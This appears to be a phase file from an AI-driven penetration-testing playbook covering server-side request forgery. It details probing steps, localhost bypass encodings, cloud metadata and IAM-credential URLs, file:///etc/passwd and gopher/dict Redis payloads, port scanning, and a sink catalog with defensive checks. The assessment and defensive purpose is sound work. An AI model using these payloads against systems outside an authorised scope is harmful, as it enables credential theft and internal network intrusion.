# Session 06: Server-Side Request Forgery (SSRF)

Covers: Classic, blind, semi-blind, and stored SSRF.

## Tool Selection

| Need | Tier | Tool |
|------|------|------|
| Callback/metadata detection | Tier 1 | `ensphere verify ssrf` |
| SSRF payload lookup | Tier 1 | `ensphere payloads ssrf` |
| Internal URL probing, port scanning | Tier 2 | `curl` via Bash |
| Client-side redirect chains | Tier 3 | Playwright MCP (only for redirect-based SSRF) |

**Decision flow:**
1. Use `ensphere verify ssrf` for automated metadata detection and response comparison
2. Use `ensphere payloads ssrf` for curated SSRF probes (metadata, bypass variants)
3. Use `curl` for internal URL probing, port scanning, and protocol testing
4. Use Playwright only for SSRF via client-side redirect chains requiring browser context

## Black-Box Path

When assessment mode is BLACK_BOX, replace Phase A (code analysis) with the following. Phase B (Exploitation) still applies after this.

**Key constraint**: Without a callback server (Burp Collaborator, interactsh), blind SSRF detection relies entirely on response-differential analysis. Document this limitation in the report.

### Phase A-BB: URL Parameter Probing (replaces code analysis)

Read `ensphere-pentest/01-recon/report.md` section 10 (SSRF Candidate Inputs) for your target list.
Read the Technology Profile from `ensphere-pentest/progress.md`.

**Step 1 — Identify URL-Accepting Parameters**: From recon, catalog parameters whose names suggest URL input:

| Parameter Pattern | Risk Level |
|-------------------|-----------|
| `url`, `uri`, `link`, `href`, `src` | HIGH |
| `callback`, `webhook`, `notify`, `ping` | HIGH |
| `image`, `avatar`, `icon`, `logo`, `photo` | HIGH |
| `import`, `fetch`, `load`, `source`, `feed` | HIGH |
| `proxy`, `forward`, `gateway` | CRITICAL |
| `redirect`, `return_url`, `next`, `continue` | MEDIUM (open redirect → SSRF chain) |
| `pdf`, `render`, `preview`, `screenshot` | HIGH (server-side rendering) |

Also check for URL-accepting parameters discovered via content-type or behavior (e.g., endpoints that fetch remote resources).

**Step 2 — Baseline Response Capture**: For each URL-accepting parameter, establish a baseline:
```bash
# Normal external URL
curl -s -o /dev/null -w "%{http_code} %{size_download} %{time_total}" \
  "TARGET/endpoint?url=https://example.com"
```
Record: status code, response body length, response time.

**Step 3 — Internal URL Probing**: Inject localhost variants and compare to baseline. Use `ensphere payloads ssrf --technique internal_service --max-risk 2` for curated bypass variants. Manual probes:

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.1
http://2130706433          (decimal IP for 127.0.0.1)
http://0x7f000001          (hex IP for 127.0.0.1)
http://017700000001        (octal IP for 127.0.0.1)
http://127.0.0.1:PORT      (for ports: 80, 443, 3000, 8080, 8443)
```

**Step 4 — Response Differential Analysis**: Compare each probe response to baseline:

| Signal | Confidence | Meaning |
|--------|-----------|---------|
| Different status code (e.g., 500 vs 200) | MEDIUM | Server attempted to fetch internal URL |
| Different response body length | MEDIUM | Different content returned |
| Response contains internal service content (HTML admin page, API health check) | **HIGH — SSRF confirmed** | Server fetched and returned internal content |
| Response contains cloud metadata (instance-id, iam credentials) | **HIGH — Critical SSRF** | Cloud metadata accessible |
| "Connection refused" error for closed port vs "Connection timeout" for open port | MEDIUM | Port is reachable but refused |
| Significantly different response time (>2s difference) | LOW | Possible but inconclusive |
| Same response as baseline | — | Input likely sanitized or URL not fetched |

**Step 5 — Cloud Metadata Probing**: Test cloud metadata endpoints (high-impact SSRF):
```
http://169.254.169.254/latest/meta-data/                              # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/     # AWS IAM roles
http://169.254.169.254/latest/dynamic/instance-identity/document      # AWS instance info
http://169.254.169.254/metadata/instance?api-version=2021-02-01       # Azure (needs header)
http://metadata.google.internal/computeMetadata/v1/instance/          # GCP (needs header)
```
Use `ensphere verify ssrf --url URL --param PARAM --in-scope SCOPE` for structured verification.

**Step 6 — Redirect Chain Testing**: If direct internal URLs are blocked, test redirect-based bypass:
- Use open redirects found in Session 01 recon to chain: `external-redirect.com/redir?to=http://127.0.0.1`
- Test URL shorteners pointing to internal addresses
- Test DNS rebinding (limited without callback server — document as limitation)

**Step 7 — Protocol Testing**: Test non-HTTP protocols:
- `file:///etc/passwd` — local file read
- `gopher://127.0.0.1:6379/_INFO` — Redis interaction
- `dict://127.0.0.1:6379/INFO` — Redis info via dict protocol
- Use `ensphere payloads ssrf --technique protocol_smuggling` for curated payloads

**Step 8 — Port Scanning via SSRF** (only if SSRF is confirmed or strongly suspected):
Probe common internal service ports via response timing:
```
127.0.0.1:22    (SSH)
127.0.0.1:80    (HTTP)
127.0.0.1:443   (HTTPS)
127.0.0.1:3000  (Node.js dev)
127.0.0.1:3306  (MySQL)
127.0.0.1:5432  (PostgreSQL)
127.0.0.1:6379  (Redis)
127.0.0.1:8080  (Alternative HTTP)
127.0.0.1:8443  (Alternative HTTPS)
127.0.0.1:9200  (Elasticsearch)
127.0.0.1:27017 (MongoDB)
```
Open ports respond faster (connection established then refused/responded). Closed ports timeout. Compare response times.

After Phase A-BB, proceed to **Phase B: Exploitation** (same as white-box path).

## Phase A: Analysis

Read `ensphere-pentest/01-recon/report.md` section 10 (SSRF Sinks).
Create a task for each sink to trace.

### Sink Catalog

**HTTP(S) Clients**: curl, requests (Python), axios (Node.js), fetch, net/http (Go), HttpClient (Java/.NET), urllib, RestTemplate, WebClient, OkHttp

**Raw Sockets**: Socket.connect, net.Dial (Go), socket.connect (Python), TcpClient, java.net.Socket

**URL Openers & File Includes**: file_get_contents (PHP), fopen, include/require, new URL().openStream() (Java), urllib.urlopen, fs.readFile with URLs, dynamic import()

**Redirect Handlers**: auto-follow redirects in HTTP clients, framework redirect handlers, "return URL" / "continue to" parameters

**Headless Browsers**: Puppeteer (page.goto), Playwright (page.navigate), Selenium WebDriver, html-to-pdf converters, SSR with external content

**Media Processors**: ImageMagick (convert with URLs), FFmpeg with network sources, wkhtmltopdf, image optimization with URL params

**Link Preview/Unfurlers**: chat link expanders, CMS link previews, oEmbed fetchers, social card generators, URL metadata extractors

**Webhook Testers**: "ping my webhook" features, outbound callback verification, health check notifications, event delivery confirmation

**SSO/JWKS Fetchers**: OpenID Connect discovery, JWKS fetchers, OAuth metadata, SAML metadata, federation metadata

**Importers**: "import from URL" features, CSV/JSON/XML remote loaders, RSS/Atom readers, API data sync, config file fetchers

### Backward Taint Analysis

For each sink:
1. **Trace backward** from outbound request to source
2. **Sanitization check** — early termination if:
   - HTTP client: scheme allowlist + host/domain allowlist + CIDR/IP block → SAFE
   - Raw socket: port allowlist + CIDR/IP block → SAFE
   - Media/render: network disabled or strict allowlist → SAFE
   - Webhook: per-tenant/domain allowlist → SAFE
   - OIDC/JWKS: issuer/domain allowlist + HTTPS enforcement → SAFE
3. **Mutation check**: any concat, redirect, or protocol swap after sanitization invalidates it
4. **Source identification**:
   - Immediate user input (param, header, form) → **Reflected SSRF**
   - Database read (webhook URL, stored config) → **Stored SSRF**
   - No response returned → **Blind SSRF**
   - Only error/timing info → **Semi-blind SSRF**

### 7-Point Checklist

1. **HTTP client usage**: user input reaches outbound request construction
2. **Protocol validation**: only approved schemes allowed (https, http) — no file://, gopher://, ftp://, dict://
3. **Hostname/IP validation**: private ranges blocked (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
4. **Port restrictions**: only approved ports (80, 443) — block internal service ports (22, 3306, 5432, 6379)
5. **URL parsing bypass**: resistant to double encoding, Unicode normalization, IPv6, IDN, redirect chains
6. **Header stripping**: sensitive headers (Authorization, Cookie) stripped from proxied requests
7. **Response handling**: errors don't leak internal network info, response size limited

## Phase B: Exploitation

**Before crafting payloads manually, query the payload database:**
```bash
ensphere payloads ssrf --max-risk 2                    # safe probes first
ensphere payloads ssrf --technique metadata_access      # cloud metadata payloads
ensphere payloads ssrf --technique internal_service     # localhost bypass variants
```
Use the returned payloads as starting points. Only craft custom payloads if the database doesn't cover your exact scenario.

**For structured exploitation, materialize a template:**
```bash
ensphere template ssrf-probe --out ./poc/ssrf
# Edit ./poc/ssrf/exploit.py with target-specific values, then run:
python3 ./poc/ssrf/exploit.py
```

### SSRF Types and Validation

**Classic (response returned)**: Supply controlled URL → check if response body contains remote resource content.

**Blind (no response)**: Use out-of-band endpoint (Burp Collaborator, Interactsh, own DNS/HTTP server) → observe incoming connections.

**Semi-blind (partial signals)**: Compare responses to dead IP vs live host → timing differences, error message differences, status code changes.

**Stored**: Plant malicious URL in stored field (webhook config) → wait for server to trigger request.

### Target Payloads

```
# Internal service access
http://127.0.0.1:8080/admin
http://localhost/admin
http://192.168.1.1/api/status
http://10.0.0.1:3000/health

# Cloud metadata
http://169.254.169.254/latest/meta-data/                              # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/     # AWS IAM
http://169.254.169.254/metadata/instance?api-version=2021-02-01       # Azure
http://metadata.google.internal/computeMetadata/v1/instance/          # GCP

# Port scanning
http://127.0.0.1:3306   # MySQL
http://127.0.0.1:5432   # PostgreSQL
http://127.0.0.1:6379   # Redis
```

### Impact Evidence Checklist
- [ ] Internal service access: response from internal API/admin interface
- [ ] Cloud metadata retrieval: instance info or credentials from metadata endpoint
- [ ] Network reconnaissance: port scan results distinguishing open vs closed ports

## Report Format

Write to `ensphere-pentest/06-ssrf/report.md`:
- Successfully Exploited (with SSRF type, endpoint, payload, internal access evidence)
- Secure by Design (table: Component | Endpoint | Defense Mechanism | Verdict)
